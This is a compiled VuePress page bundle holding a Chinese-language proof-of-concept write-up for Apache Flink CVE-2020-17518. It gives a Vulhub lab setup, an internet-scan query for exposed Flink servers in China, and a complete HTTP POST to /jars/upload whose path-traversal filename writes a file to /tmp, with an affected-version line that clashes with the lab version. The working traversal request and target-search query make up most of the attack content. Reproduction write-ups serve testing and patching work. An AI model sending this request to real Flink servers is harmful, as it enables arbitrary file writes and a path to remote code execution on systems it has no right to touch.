import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as r,c as s,a as e,b as a,d as i,e as l}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u=e("p",null,"Apache Flink 是一个开源流处理框架，具有强大的流处理和批处理能力。",-1),p=e("p",null,"Apache Flink 1.5.1 引入了一个 REST 处理程序，可以通过恶意修改的 HTTP HEADER 将上传的文件写入本地文件系统上的任意位置。",-1),h=e("p",null,"Apache Flink 的任意 Jar 包上传可以导致远程代码执行。",-1),m=e("p",null,"参考：",-1),v={href:"https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4",target:"_blank",rel:"noopener noreferrer"},b={href:"https://nvd.nist.gov/vuln/detail/CVE-2020-17518",target:"_blank",rel:"noopener noreferrer"},_=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Flink  &lt;= 1.9.1(最新版本)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Apache-Flink&quot; &amp;&amp; country=&quot;CN&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行以下命令启动 Apache Flink jobmanager 1.11.2：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Apache Flink 启动后，访问 <code>http://your-ip:8081</code> 查看主页。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="上传文件" tabindex="-1"><a class="header-anchor" href="#上传文件" aria-hidden="true">#</a> 上传文件</h3><p>使用以下请求将文件上传到 <code>/tmp/awesome_poc</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jars/upload HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 187

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/awesome_poc&quot;

success
------WebKitFormBoundaryoZ8meKnrrso89R6Y--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231639569.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看 docker，<code>/tmp/awesome_poc</code> 成功创建。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231640168.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15);function g(f,x){const n=d("ExternalLinkIcon");return r(),s("div",null,[c,u,p,h,m,e("ul",null,[e("li",null,[e("a",v,[a("https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4"),i(n)])]),e("li",null,[e("a",b,[a("https://nvd.nist.gov/vuln/detail/CVE-2020-17518"),i(n)])])]),_])}const F=t(o,[["render",g],["__file","Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518.html.vue"]]);export{F as default};
